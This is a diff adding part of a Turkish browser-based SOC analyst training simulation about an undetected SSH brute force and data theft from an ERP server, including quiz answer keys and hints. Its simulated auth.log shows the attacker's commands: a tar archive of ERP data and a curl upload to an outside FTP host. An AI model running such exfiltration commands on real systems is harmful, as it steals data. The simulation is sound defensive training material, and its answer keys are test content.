+    <p class="sub" style="margin-top:12px;font-size:11px">Enter tuşu ile de başlatabilirsiniz.</p>
+  </div>
+</section>
+<div class="desktop hidden" id="desktop">
+  <div class="wm">AKTAŞMAKİNA SOC</div>
+  <div class="chrono-hint-bar">
+    <div class="chrono-w"><small>Vardiya Süresi</small><span id="chronoDesk">00:00</span></div>
+    <button type="button" class="hint-top-btn" id="btnStageHint" title="Yalnızca bu aşama için ipucu">💡 İpucu</button>
+  </div>
+  <div id="hintLayer" class="hint-layer hidden" onclick="if(event.target===this)KN.closeHint()">
+    <div class="hint-layer-card" onclick="event.stopPropagation()">
+      <div id="hintPolicyBlock" class="hidden">
+        <h3>💡 İpucu kullanımı</h3>
+        <p id="hintPolicyText" style="font-size:13px;color:var(--muted);line-height:1.65"></p>
+        <button type="button" class="btn ok" style="margin-top:14px" id="btnHintAck">Anladım, ipucuyu göster</button>
+      </div>
+      <div id="hintContentBlock">
+        <h3>💡 Aşama ipucu — tam rehber</h3>
+        <p class="small muted" style="margin-bottom:8px">Komutlar, şıklar ve tam cevaplar yalnızca burada gösterilir.</p>
+        <div class="hint-stage" id="hintStageLabel"></div>
+        <div id="hintStageText" class="hint-body"></div>
+        <button type="button" class="btn sm" style="margin-top:14px" onclick="KN.closeHint()">Kapat</button>
+      </div>
+    </div>
+  </div>
+  <div class="icons" id="icons"></div>
+  <div id="windows"></div>
+  <div class="taskbar">
+    <button type="button" class="start-btn" id="btnStartMenu" title="Başlat">⊞</button>
+    <div class="task-btns" id="taskBtns"></div>
+    <div class="tb-stats">
+      <span>Vardiya <b id="chronoTb">00:00</b></span>
+      <span>Aşama <b id="stageNum">1</b>/11</span>
+      <span>Puan <b id="scoreVal">100</b>/100</span>
+      <span>Kanıt <b id="evCount">0</b>/8</span>
+    </div>
+    <span class="tb-clock" id="tbClock">Sal 09:17</span>
+  </div>
+  <div class="start-menu hidden" id="startMenu"></div>
+</div>
+<div class="toast-wrap" id="toastWrap"></div>
+<section class="result-screen hidden" id="resultScreen"></section>
+
+<script>
+/* KÖR NOKTA — SOC Desktop Sim */
+(function () {
+  "use strict";
+
+  var S = {
+    name: "", scene: 1, maxScene: 1, score: 100, evidence: [], flags: {},
+    chronoStart: null, chronoId: null, z: 100, windows: {}, minimized: {}, maximized: {},
+    activeWindow: null, selectedIcon: null, mailRead: false, irTab: "gap",
+    evidenceReminderId: null, evidenceReminderTimer: null,
+    hintDeductions: [], wrongDeductions: []
+  };
+
+  var SCORE_MAX = 100;
+  var SIM_ID = "kor-nokta-soc-simulasyonu";
+  var SIM_NAME = "Kör Nokta — SOC Analisti";
+
+  var STAGE_HINT_POINTS = {
+    1: { points: 10, label: "Aşama 1 — SIEM ve görünürlük sorusu" },
+    2: { points: 8, label: "Aşama 2 — log akışı / rsyslog" },
+    3: { points: 9, label: "Aşama 3 — auditd ve Kanıt Çantası sorusu" },
+    4: { points: 5, label: "Aşama 4 — auth.log" },
+    5: { points: 10, label: "Aşama 5 — firewall ve korelasyon sorusu" },
+    6: { points: 9, label: "Aşama 6 — sudo / exfiltration sorusu" },
+    7: { points: 5, label: "Aşama 7 — proxy" },
+    8: { points: 10, label: "Aşama 8 — zaman çizelgesi" },
+    9: { points: 12, label: "Aşama 9 — görünürlük tablosu" },
+    10: { points: 12, label: "Aşama 10 — risk önceliklendirme" },
+    11: { points: 5, label: "Aşama 11 — SOC briefing" }
+  };
+
+  var WRONG_PENALTIES = {
+    q1: { points: 5, label: "SIEM görünürlük sorusu" },
+    q3: { points: 5, label: "Auditd sorusu" },
+    q5: { points: 5, label: "Firewall korelasyon sorusu" },
+    q6: { points: 5, label: "Exfiltration sorusu" },
+    gap: { points: 10, label: "Görünürlük tablosu" },
+    prio: { points: 10, label: "Risk önceliklendirme" },
+    timeline: { points: 10, label: "Olay zaman çizelgesi" }
+  };
+
+  var EVIDENCE_REMINDER_MS = 65000;
+
+  var EVIDENCE_DEF = {
+    ev1: {
+      title: "Görünürlük Boşluğu #1 — Log forwarder çalışmıyor",
+      text: "ERP-PROD-04 üzerinde SIEM'e log göndermek için rsyslog forward yapılandırması mevcut. Ancak rsyslog servisi 9 Kasım'dan beri failed durumda olduğu için sunucudan SIEM'e log akışı durmuş. Bu nedenle 14 Kasım'daki SSH brute-force ve başarılı giriş olayları SIEM'de alarm üretmemiş.",
+      type: "warn"
+    },
+    ev2: { title: "Görünürlük Boşluğu #2", text: "Auditd kurulu değil. Privilege escalation ve hassas dosya erişimi görünmez.", type: "warn" },
+    ev3: { title: "Yerel auth.log", text: "SSH brute force ve erpadmin ile başarılı giriş kanıtı (SIEM'e gitmemiş).", type: "crit" },
+    ev4: { title: "Görünürlük Boşluğu #3", text: "Detection kuralı eksik log kaynağına bağımlı — alarm üretmedi.", type: "warn" },
+    ev5: { title: "Veri dışarı aktarma", text: "tar + curl ile ERP verisinin FTP hedefine yüklenmesi (exfiltration).", type: "crit" },
+    ev6: { title: "Görünürlük Boşluğu #5", text: "Proxy bypass ve geniş outbound — veri çıkışı proxy loglarında görünmedi.", type: "warn" },
+    ev7: { title: "Firewall korelasyonu", text: "185.220.101.47 → 10.12.4.55:22 — 91 ALLOW kaydı.", type: "crit" },
+    ev8: { title: "Zaman çizelgesi", text: "Olay akışı 02:33–04:18 arası doğrulandı.", type: "ok" }
+  };
+
+  var SCENES = [
+    "E-posta ve İlk Şok", "Linux Log Akışı", "Auditd Kontrolü", "Yerel auth.log",
+    "Firewall Korelasyonu", "Privilege Escalation", "Proxy Bypass", "Zaman Çizelgesi",
+    "Görünürlük Tablosu", "Risk Önceliklendirme", "SOC Lead Briefing"
+  ];
+
+  var MISSIONS = [
+    { obj: "Üst yönetim acil e-postasını okuyun, SIEM'de sorgu çalıştırın ve görünürlük sorusunu yanıtlayın.",
+      hint: "Outlook ve Elastic Security — ayrıntılar için 💡 İpucu.", steps: ["Yönetim e-postası", "SIEM sorgusu", "Görünürlük sorusu"] },
+    { obj: "CMDB'de ERP-PROD-04 kaynağını inceleyin; terminalde log iletim servisi ve SIEM yönlendirme dosyasını kontrol edin; kanıt ekleyin.",
+      hint: "Terminalde iki ayrı Linux kontrolü — tam komutlar 💡 İpucu'da.", steps: ["CMDB incele", "Terminal: log akışı", "Kanıt Çantası"] },
+    { obj: "Terminalde audit daemon kurulumunu doğrulayın, ilgili soruyu yanıtlayın, kanıt ekleyin.",
+      hint: "Servis ve ikili dosya kontrolü ayrı adımlar.", steps: ["Terminal: auditd", "Kanıt Çantası sorusu", "Kanıt ekle"] },
+    { obj: "Yerel kimlik doğrulama loglarını inceleyin ve kanıt ekleyin.", hint: "Terminal — şüpheli IP odaklı sorgu.", steps: ["auth.log inceleme", "Kanıt ekle"] },
+    { obj: "Firewall log sorgulayın, korelasyon sorusunu yanıtlayın, kanıtları toplayın.",
+      hint: "Panorama filtreleri e-postadaki olay özetine göre.", steps: ["FW sorgusu", "Korelasyon sorusu", "Kanıtlar"] },
+    { obj: "Ayrıcalık ve veri hareketi izlerini inceleyin, ilgili soruyu yanıtlayın, kanıt ekleyin.",
+      hint: "Terminal oturum ve sudo kayıtları.", steps: ["sudo/oturum logları", "Davranış sorusu", "Kanıt ev5"] },
+    { obj: "Proxy loglarını sorgulayın, kanıt ekleyin.", hint: "Blue Coat — ERP sunucusu istemci IP'si.", steps: ["Proxy sorgusu", "Kanıt ev6"] },
+    { obj: "7 olayı kronolojik sıraya dizin ve doğrulayın.", hint: "Zaman Çizelgesi uygulaması.", steps: ["Olay sıralama", "Doğrula"] },
+    { obj: "IR Portal — Görünürlük Tablosu eşleştirmesini tamamlayın.", hint: "Her boşluğu «kör etti» sütunuyla eşleştirin.", steps: ["Tablo doğrula"] },
+    { obj: "IR Portal — Risk Önceliklendirme sınıflandırması.", hint: "Kartları Acil / Bu hafta / Bu ay kutularına sürükleyin.", steps: ["Öncelik doğrula"] },
+    { obj: "IR Portal — SOC Lead Briefing: metinleri gözden geçirip Briefing Hazırla ile vakayı kapatın.", hint: "Örnek metinler düzenlenebilir.", steps: ["Briefing gönder"] }
+  ];
+
+  var STAGE_TOAST_NUDGES = [
+    "",
+    "Outlook ve Elastic Security ile başlayın.",
+    "CMDB ve Terminal açıldı — log akışı görünürlüğünü inceleyin.",
+    "Audit daemon kontrolü — Terminal ve Kanıt Çantası.",
+    "Yerel auth log incelemesi — Terminal.",
+    "Palo Alto Panorama ile firewall logları.",
+    "Terminal: oturum ve sudo izleri.",
+    "Blue Coat ProxySG sorgusu.",
+    "Olay Zaman Çizelgesi uygulaması.",
+    "IR Portal — Görünürlük Tablosu.",
+    "IR Portal — Risk Önceliklendirme.",
+    "IR Portal — SOC Lead Briefing."
+  ];
+
+  var APP_DEFS = {
+    mail: { title: "Outlook — RedSentinel", icon: "📧", w: 720, h: 480, x: 60, y: 40, unlock: 1 },
+    siem: { title: "Elastic Security", icon: "🔍", w: 680, h: 420, x: 100, y: 60, unlock: 1 },
+    assets: { title: "ServiceNow CMDB", icon: "🗂️", w: 620, h: 440, x: 140, y: 50, unlock: 2 },
+    terminal: { title: "Windows Terminal — OpenSSH", icon: "⌨", w: 680, h: 440, x: 80, y: 70, unlock: 2 },
+    firewall: { title: "Palo Alto Panorama", icon: "🛡️", w: 780, h: 520, x: 100, y: 40, unlock: 5 },
+    proxy: { title: "Blue Coat ProxySG", icon: "🌐", w: 780, h: 500, x: 140, y: 48, unlock: 7 },
+    evidence: { title: "Kanıt Çantası", icon: "🎒", w: 420, h: 460, x: 200, y: 40, unlock: 2 },
+    timeline: { title: "Olay Zaman Çizelgesi", icon: "📅", w: 560, h: 480, x: 90, y: 35, unlock: 8 },
+    irportal: { title: "IR Playbook Portal", icon: "📋", w: 680, h: 500, x: 110, y: 30, unlock: 9 },
+    mission: { title: "SOC Mission Desk", icon: "🎯", w: 440, h: 380, x: 520, y: 80, unlock: 1 }
+  };
+
+  var APP_ORDER = ["mission", "mail", "siem", "assets", "terminal", "firewall", "proxy", "evidence", "timeline", "irportal"];
+
+  var TL_EVENTS = [
+    { id: "t1", time: "02:33", text: "SSH brute force başladı" },
+    { id: "t2", time: "02:41", text: "erpadmin ile başarılı giriş" },
+    { id: "t3", time: "02:43", text: "sudo ile root komutları" },
+    { id: "t4", time: "02:43", text: "/opt/erp/data/ tarandı" },
+    { id: "t5", time: "02:44", text: "Veriler /tmp/.x11/ arşivlendi" },
+    { id: "t6", time: "02:45", text: "curl ile FTP yükleme" },
+    { id: "t7", time: "04:18", text: "Oturum kapandı" }
+  ];
+  var TL_ORDER = ["t1", "t2", "t3", "t4", "t5", "t6", "t7"];
+
+  var QUIZ_META = {
+    q1: { flag: "s1_q", correct: 1 },
+    q3: { flag: "s3_q", correct: 1 },
+    q5: { flag: "s5_q", correct: 1 },
+    q6: { flag: "s6_q", correct: 1 }
+  };
+
+  var QUIZ_EXPLAIN = {
+    q1: {
+      text: "Doğru cevap B: SIEM'de alarm olmaması, olay olmadığı veya «her şey yolunda» anlamına gelmez. Log/telemetri eksikliği ve görünürlük boşluğu mümkündür — bu vakada rsyslog servisi failed olduğu için 14 Kasım olayları SIEM'e ulaşmamıştır.",
+      short: "Yanlış — açıklamayı okuyun, ardından doğru şıkkı (B) seçin.",
+      wrong: {
+        0: "A şıkkı: Tehdit olmadığı sonucuna erken varılmamalı; önce log akışı ve connector health doğrulanmalı.",
+        2: "C şıkkı: Erken IP bloklama kanıt toplamadan kör önlem olur; önce görünürlük ve olay doğrulaması gerekir.",
+        3: "D şıkkı: SOC vardiyası üretim ERP gibi kritik sistemlerde olay doğrulama sorumluluğunu üstlenir."
+      }
+    },
+    q3: {
+      text: "Doğru cevap B: Auditd; /opt/erp/data/ erişimi, sudo/root kullanımı, dosya okuma/yazma ve process (execve) izlerini üretir. Firewall trafiği auditd kapsamında değildir.",
+      short: "Yanlış — doğru şıkkı (B) seçin.",
+      wrong: {
+        0: "Auditd host içi aktiviteyi loglar; perimeter firewall logu değildir.",
+        2: "E-posta trafiği bu sunucuda auditd odak alanı değil.",
+        3: "DNS auditd ile sınırlı değildir; dosya ve privilege izleri asıl boşluktur."
+      }
+    },
+    q5: {
+      text: "Doğru cevap B: DET-SSH-001 kuralı firewall + auth.log korelasyonu ister. auth.log SIEM'e gitmediği için kural tetiklenmemiş; firewall logları tek başına yeterli değil.",
+      short: "Yanlış — doğru şıkkı (B) seçin.",
+      wrong: {
+        0: "Firewall logları SIEM'e geliyor; asıl eksik auth.log kaynağı.",
+        2: "Saldırgan IP whitelist'te değil; korelasyon kırıldı.",
+        3: "Kural devre dışı değil; bağımlı log kaynağı eksik."
+      }
+    },
+    q6: {
+      text: "Doğru cevap B: curl -T ile FTP hedefine yükleme veri dışarı aktarma (exfiltration) göstergesidir. Yerel yedekleme rutini veya log rotation değildir.",
+      short: "Yanlış — doğru şıkkı (B) seçin.",
+      wrong: {
+        0: "tar + curl kombinasyonu dış hedefe yükleme; rutin yedek değil.",
+        2: "Sistem güncellemesi değil; şüpheli curl satırı exfiltration.",
+        3: "Log rotation değil; /tmp/.x11/ altında arşiv ve FTP upload."
+      }
+    }
+  };
+
+  var GAP_ROWS = [
+    { gap: "rsyslog servisi çalışmıyor", cause: "Servis 9 Kasım'da çökmüş, kimse fark etmemiş", blind: "Brute force + giriş tespiti" },
+    { gap: "Auditd kurulu değil", cause: "Hiç yapılandırılmamış", blind: "Privilege escalation, dosya erişimi" },
+    { gap: "Detection kuralı eksik kaynağa bağımlı", cause: "auth.log + firewall korelasyonu, biri eksik", blind: "Brute force alarmı" },
+    { gap: "Hassas dizin denetimi yok", cause: "Auditd kuralı tanımlanmamış", blind: "/opt/erp/data/ erişimi" },
+    { gap: "Proxy bypass tanımı", cause: "ERP sunucusuna outbound açık kalmış", blind: "Veri sızdırma" }
+  ];
+
+  var SHIFT_CLOCK_BASE_MIN = 9 * 60 + 17;
+
+  var BRIEF_DEFAULTS = {
+    bulgu: "14 Kas 02:33–04:18: 185.220.101.47 → ERP-PROD-04 (10.12.4.55) SSH brute force; erpadmin girişi; /opt/erp/data/ tarama; tar arşivi ve curl ile FTP exfiltration. SIEM alarmı yok.",
+    etki: "SIEM korelasyonu auth.log eksikliğiyle kırıldı. rsyslog failed, auditd yok, ERP proxy bypass — brute force, privilege escalation, dosya erişimi ve exfiltration zayıf görünürlükte kaldı.",
+    kanit: "Yerel auth.log brute force+giriş; rsyslog forward+failed; auditd yok; firewall 91×ALLOW :22; proxy 0 log; sudo/tar/curl exfiltration; olay timeline 02:33–04:18 doğrulandı.",
+    oneri: "Acil: rsyslog restore+izleme, 185.220.101.47 blok. Bu hafta: auditd+/opt/erp/data/ kuralları, connector health. Bu ay: proxy bypass ve detection bağımlılık kontrolü; IR koordinasyonu."
+  };
+
+  var PRIO_ITEMS = [
+    { id: "p1", text: "10.12.4.55 rsyslog yeniden başlat ve izle", cat: "urgent" },
+    { id: "p2", text: "Üretim Linux sunucularında rsyslog sağlık kontrolü", cat: "urgent" },
+    { id: "p3", text: "185.220.101.47 geçici blok / IR önerisi", cat: "urgent" },
+    { id: "p4", text: "Linux üretim sunucularına Auditd kur", cat: "week" },
+    { id: "p5", text: "/opt/erp/data/ için auditd kuralları", cat: "week" },
+    { id: "p6", text: "Connector health monitoring", cat: "week" },
+    { id: "p7", text: "ERP proxy bypass gözden geçir", cat: "month" },
+    { id: "p8", text: "Detection kural bağımlılık sağlık kontrolü", cat: "month" }
+  ];
+
+  var STAGE_HINTS = {
+    1:
+      "<p>Outlook’ta <b>[ACİL — YÖNETİM] ERP güvenlik olayı</b> e-postasını okuyun. Kaynak ve hedef IP burada.</p>" +
+      "<ul class=\"hint-list\">" +
+      "<li><b>Elastic Security</b> — E-postadaki iki IP’yi <code>OR</code> ile sorgulayın, <b>Ara</b>’ya basın.</li>" +
+      "<li><b>Soru</b> — SIEM’de alarm yoksa <b>B</b> şıkkı (bu «normal» demek değildir).</li>" +
+      "</ul>",
+    2:
+      "<p>CMDB’de ERP-PROD-04 kaydını açın. Connector’ın sağlıksız ve log gelmediğini not edin.</p>" +
+      "<p><b>Terminal</b> — Komutları ayrı satırlarda çalıştırın (pipe <code>|</code> kullanmayın):</p>" +
+      "<ul class=\"hint-list\">" +
+      "<li><code>systemctl status rsyslog</code></li>" +
+      "<li><code>cat /etc/rsyslog.d/siem-forward.conf</code> <span style=\"opacity:.85\">(yolun sonuna fazladan nokta koymayın)</span></li>" +
+      "</ul>" +
+      "<p>Servis <i>failed</i>, dosyada SIEM’e forward var. Sonra Kanıt Çantası’na <b>Görünürlük Boşluğu #1</b> ekleyin.</p>",
+    3:
+      "<p><b>Terminal</b> — Auditd kontrolü için iki komut:</p>" +
+      "<ul class=\"hint-list\">" +
+      "<li><code>systemctl status auditd</code></li>" +
+      "<li><code>command -v auditctl</code></li>" +
+      "</ul>" +
+      "<p>İkisini tek satırda <code>;</code> ile yazabilirsiniz. Pipe veya «ve» ile birleştirmeyin.</p>" +
+      "<p>Kanıt Çantası: <b>Görünürlük Boşluğu #2</b>. Auditd sorusu: <b>B</b>.</p>",
+    4:
+      "<p><b>Terminal:</b></p>" +
+      "<p><code>tail -200 /var/log/auth.log | grep \"185.220.101.47\"</code></p>" +
+      "<p>IP’yi e-postadaki saldırgan adresinden alın. Brute force ve başarılı <b>erpadmin</b> girişini görün.</p>" +
+      "<p>Kanıt Çantası’na <b>Yerel auth.log</b> ekleyin.</p>",
+    5:
+      "<p>Palo Alto Panorama → Traffic log. <b>Source, Destination ve Port</b> değerlerini yönetim e-postasındaki «Özet teknik bilgi» bölümünden girin.</p>" +
+      "<ul class=\"hint-list\">" +
+      "<li><b>Filter Logs</b> çalıştırın, logları inceleyin</li>" +
+      "<li><b>DET-SSH-001</b> kuralını okuyun</li>" +
+      "<li>Firewall kanıtını Kanıt Çantası’na ekleyin</li>" +
+      "<li>Korelasyon sorusu: <b>B</b> (kural hem firewall hem auth.log ister)</li>" +
+      "</ul>",
+    6:
+      "<p><b>Terminal</b> — Aşağıdakilerden birini veya ikisini çalıştırın:</p>" +
+      "<ul class=\"hint-list\">" +
+      "<li><code>last | grep erpadmin</code></li>" +
+      "<li><code>sudo cat /var/log/auth.log | grep \"sudo\\|Nov 14\"</code></li>" +
+      "</ul>" +
+      "<p>Çıktıda <b>tar</b> ve <b>curl</b> satırlarını bulun. Kanıt: exfiltration. Soru: <b>B</b>.</p>",
+    7:
+      "<p>Blue Coat ProxySG → <b>Show Log Tail</b>. Sonuç <b>0 kayıt</b> çıkar; alttaki proxy bypass yorumunu okuyun (ERP trafiği SWG’den geçmiyor).</p>" +
+      "<p>Kanıt Çantası’na <b>Görünürlük Boşluğu #5</b> ekleyin.</p>",
+    8:
+      "<p>Olay Zaman Çizelgesi — Soldaki olayları sağa, <b>eskiden yeniye</b> tıklayın. Yanlış seçimi aynı kutuya tekrar tıklayarak geri alın.</p>" +
+      "<ol class=\"hint-list\">" +
+      "<li>02:33 — SSH brute force</li>" +
+      "<li>02:41 — erpadmin girişi</li>" +
+      "<li>02:43 — sudo / root komutları</li>" +
+      "<li>02:43 — /opt/erp/data/ tarama</li>" +
+      "<li>02:44 — arşiv (/tmp/.x11/)</li>" +
+      "<li>02:45 — curl ile FTP</li>" +
+      "<li>04:18 — oturum kapandı</li>" +
+      "</ol>" +
+      "<p>Yedi kutu dolunca <b>Doğrula</b>.</p>",
+    9:
+      "<p>IR Portal → Görünürlük Tablosu. Her satırda sağ sütunu eşleştirin:</p>" +
+      "<ul class=\"hint-list\">" +
+      "<li>rsyslog çalışmıyor → Brute force + giriş tespiti</li>" +
+      "<li>Auditd yok → Privilege escalation, dosya erişimi</li>" +
+      "<li>Detection kuralı eksik kaynağa bağımlı → Brute force alarmı</li>" +
+      "<li>Hassas dizin denetimi yok → /opt/erp/data/ erişimi</li>" +
+      "<li>Proxy bypass → Veri sızdırma</li>" +
+      "</ul>" +
+      "<p>Hepsi doğruysa <b>Doğrula</b>.</p>",
+    10:
+      "<p>IR Portal → Risk Önceliklendirme. Kartları kutulara sürükleyin:</p>" +
+      "<p><b>Acil</b></p><ul class=\"hint-list\">" +
+      "<li>10.12.4.55 rsyslog yeniden başlat</li>" +
+      "<li>Üretim Linux rsyslog sağlık kontrolü</li>" +
+      "<li>185.220.101.47 geçici blok</li>" +
+      "</ul>" +
+      "<p><b>Bu hafta</b></p><ul class=\"hint-list\">" +
+      "<li>Linux sunuculara Auditd kur</li>" +
+      "<li>/opt/erp/data/ auditd kuralları</li>" +
+      "<li>Connector health monitoring</li>" +
+      "</ul>" +
+      "<p><b>Bu ay</b></p><ul class=\"hint-list\">" +
+      "<li>ERP proxy bypass gözden geçir</li>" +
+      "<li>Detection kural bağımlılık kontrolü</li>" +
+      "</ul>" +
+      "<p>Bitince <b>Doğrula</b>.</p>",
+    11:
+      "<p>IR Portal → SOC Lead Briefing. Metinler örnek olarak dolu; isterseniz düzenleyin.</p>" +
+      "<p>Her alan en az 40 karakter olmalı. <b>Briefing Hazırla</b> ile simülasyon biter; toplam puan sonuç ekranında görünür.</p>"
+  };
+
+  var TERM_CMDS = {
+    rsyslog_svc: {
+      minScene: 2, flag: "s2_rsys_svc",
+      match: function (c) { return /^systemctl\s+status\s+rsyslog$/.test(c) || /^sudo\s+systemctl\s+status\s+rsyslog$/.test(c); },
+      out: "erpadmin@ERP-PROD-04:~$ systemctl status rsyslog\n● rsyslog.service\n   Loaded: loaded (/lib/systemd/system/rsyslog.service; enabled; vendor preset: enabled)\n   Active: failed (Result: start-limit-hit) since Nov  9 16:41:22 UTC",
+      msg: "rsyslog servisi 9 Kasım'dan beri failed — SIEM'e log iletmiyor."
+    },
+    rsyslog_conf: {
+      minScene: 2, flag: "s2_rsys_conf",
+      match: function (c) { return /^cat\s+\/etc\/rsyslog\.d\/siem-forward\.conf$/.test(c); },
+      out: "erpadmin@ERP-PROD-04:~$ cat /etc/rsyslog.d/siem-forward.conf\n*.* @@10.0.0.5:514   # SIEM collector IP",
+      msg: "SIEM forward yapılandırması var (@@ = TCP); servis failed olduğu için akış çalışmıyor."
+    },
+    auditd_svc: {
+      minScene: 3, flag: "s3_audit_svc",
+      match: function (c) { return /^systemctl\s+status\s+auditd$/.test(c) || /^sudo\s+systemctl\s+status\s+auditd$/.test(c); },
+      out: "erpadmin@ERP-PROD-04:~$ systemctl status auditd\nUnit auditd.service could not be found.",
+      msg: "auditd systemd birimi yok — paket/servis kurulu değil."
+    },
+    auditd_bin: {
+      minScene: 3, flag: "s3_audit_bin",
+      match: function (c) { return /^which\s+auditctl$/.test(c) || /^command\s+-v\s+auditctl$/.test(c); },
+      out: "erpadmin@ERP-PROD-04:~$ command -v auditctl\n\nerpadmin@ERP-PROD-04:~$ which auditctl\nauditctl not found",
+      msg: "auditctl ikilisi PATH'te yok — auditd araçları yüklü değil."
+    },
+    authlog: {
+      minScene: 4, flag: "s4_log",
+      match: function (c) { return (/auth\.log/.test(c) && /185\.220\.101\.47/.test(c)) || (/tail/.test(c) && /auth\.log/.test(c)); },
+      out: 'erpadmin@ERP-PROD-04:~$ tail -200 /var/log/auth.log | grep "185.220.101.47"\nNov 14 02:33:17 ERP-PROD-04 sshd[14832]: Failed password for invalid user admin from 185.220.101.47\nNov 14 02:33:19 ERP-PROD-04 sshd[14833]: Failed password for root from 185.220.101.47\nNov 14 02:40:58 ERP-PROD-04 sshd[14901]: Failed password for erpadmin from 185.220.101.47\nNov 14 02:41:03 ERP-PROD-04 sshd[14902]: Accepted password for erpadmin from 185.220.101.47 port 52893 ssh2\nNov 14 02:41:03 ERP-PROD-04 sshd[14902]: pam_unix(sshd:session): session opened for user erpadmin',
+      msg: "Yerel auth.log saldırı izlerini gösteriyor."
+    },
+    sudo: {
+      minScene: 6, flag: "s6_view",
+      match: function (c) { return (/last/.test(c) && /erpadmin/.test(c)) || (/sudo/.test(c) && /auth\.log/.test(c) && /grep/.test(c)); },
+      out: 'erpadmin@ERP-PROD-04:~$ last | grep erpadmin\nerpadmin pts/0        185.220.101.47   Thu Nov 14 02:41 - 04:18  (01:37)\n\nerpadmin@ERP-PROD-04:~$ sudo cat /var/log/auth.log | grep "sudo\\|Nov 14"\nNov 14 02:43:11 ERP-PROD-04 sudo: erpadmin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/find /opt/erp/data -name "*.db"\nNov 14 02:43:44 ERP-PROD-04 sudo: erpadmin : COMMAND=/bin/tar czf /tmp/.x11/erp_backup_1114.tar.gz /opt/erp/data/\nNov 14 02:45:02 ERP-PROD-04 sudo: erpadmin : COMMAND=/usr/bin/curl -T erp_backup_1114.tar.gz ftp://transfer.darkupload[.]io/aktasmakina/',
+      msg: "Privilege escalation ve exfiltration izleri bulundu."
+    }
+  };
+
+  var TERM_WELCOME = "Microsoft Windows [Version 10.0.26200]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\SOC-Tools> ssh erpadmin@10.12.4.55\nConnecting to 10.12.4.55 via OpenSSH...\nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\n\nLast login: Thu Nov 14 02:41:03 2024 from 185.220.101.47\n";
+
+  function $(id) { return document.getElementById(id); }
+  function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"); }
+  function hasEv(id) { return S.evidence.indexOf(id) >= 0; }
+
+  function showToast(msg, type, durationMs) {
+    var wrap = $("toastWrap");
+    var t = document.createElement("div");
+    t.className = "toast" + (type ? " " + type : "");
+    t.textContent = msg;
+    wrap.appendChild(t);
+    setTimeout(function () { if (t.parentNode) t.parentNode.removeChild(t); }, durationMs || 4200);
+  }
+
+  function isEvidenceBagSeen() {
+    return !!(S.windows.evidence && !S.minimized.evidence && S.activeWindow === "evidence");
+  }
+
+  function clearEvidenceReminder() {
+    if (S.evidenceReminderTimer) {
+      clearTimeout(S.evidenceReminderTimer);
+      S.evidenceReminderTimer = null;
+    }
+    S.evidenceReminderId = null;
+  }
+
+  function showEvidenceBagNudge(evId, added) {
+    var def = EVIDENCE_DEF[evId];
+    if (!def) return;
+    if (added) {
+      showToast("Kanıt kaydedildi: " + def.title + " — 🎒 Kanıt Çantası'nı açıp kaydı inceleyin.", "ok", 5500);
+    } else {
+      showToast("Kanıt bulundu: " + def.title + " — 🎒 Kanıt Çantası'nı açıp «+ ekle» ile kaydedin.", "warn", 5500);
+    }
+  }
+
+  function scheduleEvidenceReminder(evId) {
+    if (!evId || !EVIDENCE_DEF[evId]) return;
+    if (isEvidenceBagSeen()) {
+      clearEvidenceReminder();
+      return;
+    }
+    if (S.evidenceReminderTimer) clearTimeout(S.evidenceReminderTimer);
+    S.evidenceReminderId = evId;
+    S.evidenceReminderTimer = setTimeout(function remind() {
+      if (!S.evidenceReminderId) return;
+      if (isEvidenceBagSeen()) {
+        clearEvidenceReminder();
+        return;
+      }
+      var def = EVIDENCE_DEF[S.evidenceReminderId];
+      showToast("🎒 Kanıt Çantası'nı açın ve inceleyin: " + (def ? def.title : "yeni kanıt"), "warn", 6000);
+      S.evidenceReminderTimer = setTimeout(remind, EVIDENCE_REMINDER_MS);
+    }, EVIDENCE_REMINDER_MS);
+  }
+
+  function notifyEvidenceFound(evId, added) {
+    showEvidenceBagNudge(evId, !!added);
+    scheduleEvidenceReminder(evId);
+  }
+
+  function notifyEvidenceReady(evId) {
+    if (hasEv(evId)) return;
+    notifyEvidenceFound(evId, false);
+  }
+
+  function evidenceBagHasPendingActions() {
+    if (S.flags.s2_rsys && !hasEv("ev1")) return true;
+    if (S.flags.s3_audit && !hasEv("ev2")) return true;
+    if (S.flags.s4_log && !hasEv("ev3")) return true;
+    if (S.flags.s6_q && !hasEv("ev5")) return true;
+    if (S.flags.s3_audit && (!S.flags.s3_q || S.flags.q3_wrong)) return true;
+    if (S.flags.s6_view && (!S.flags.s6_q || S.flags.q6_wrong)) return true;
+    return false;
+  }
+
+  function focusEvidenceBagForActions() {
+    if (!evidenceBagHasPendingActions()) return;
+    if (!S.windows.evidence) openWindow("evidence");
+    else {
+      if (S.minimized.evidence) {
+        S.minimized.evidence = false;
+        var w = $("win-evidence");
+        if (w) w.classList.remove("hidden");
+      }
+      refreshWindow("evidence");
+      focusWindow("evidence");
+    }
+    showToast("🎒 Kanıt Çantası — kanıt ekleyin veya soruyu yanıtlayın.", "warn", 5500);
+  }
+
+  function clearMissionFbForWrongQuestion() {
+    S.feedback = "";
+    S.feedbackType = "";
+    var el = $("misFb");
+    if (el) { el.textContent = ""; el.className = "mis-fb"; }
+  }
+
+  function setMissionFb(msg, type) {
+    S.feedback = msg || "";
+    S.feedbackType = type || "";
+    var el = $("misFb");
+    if (el) { el.textContent = msg || ""; el.className = "mis-fb" + (type ? " " + type : ""); }
+  }
+
+  function updateScoreDisplay() {
+    var el = $("scoreVal");
+    if (el) el.textContent = String(S.score);
+  }
+
+  function applyScorePenalty(key, points, label, bucket) {
+    if (!points || S.flags["penalty_" + key]) return false;
+    S.flags["penalty_" + key] = true;
+    S.score = Math.max(0, S.score - points);
+    var entry = { key: key, points: points, label: label || key };
+    if (bucket === "hint") S.hintDeductions.push(entry);
+    else S.wrongDeductions.push(entry);
+    updateScoreDisplay();
+    showToast("−" + points + " puan: " + (label || key) + " (kalan: " + S.score + "/" + SCORE_MAX + ")", "warn", 4800);
+    return true;
+  }
+
+  function applyStageHintPenalty() {
+    var cfg = STAGE_HINT_POINTS[S.scene];
+    if (!cfg) return false;
+    return applyScorePenalty("hint_s" + S.scene, cfg.points, cfg.label, "hint");
+  }
+
+  function applyWrongAnswerPenalty(penaltyKey) {
+    var cfg = WRONG_PENALTIES[penaltyKey];
+    if (!cfg) return false;
+    return applyScorePenalty("wrong_" + penaltyKey, cfg.points, cfg.label, "wrong");
+  }
+
